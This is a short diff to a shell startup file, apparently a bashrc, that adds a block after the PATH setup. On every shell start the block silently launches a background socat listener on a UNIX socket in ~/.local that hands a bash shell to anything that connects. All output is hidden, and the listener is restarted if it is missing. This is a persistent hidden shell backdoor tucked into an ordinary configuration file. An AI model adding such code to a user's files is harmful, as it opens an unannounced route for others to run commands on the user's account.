@@ -94,3 +94,13 @@ fi
 if [ -e "/usr/local/sbin" ]; then
   export PATH="/usr/local/sbin/:$PATH"
 fi
+
+if type socat >/dev/null 2>&1; then
+  run="socat UNIX-LISTEN:$HOME/.local/bash.sock,reuseaddr,fork exec:bash"
+  if ! pgrep -f "$run" >/dev/null 2>&1; then
+    if [ -e "$HOME/.local/bash.sock" ]; then
+      rm "$HOME/.local/bash.sock"
+    fi
+    sh -c "$run &" >/dev/null 2>&1
+  fi
+fi
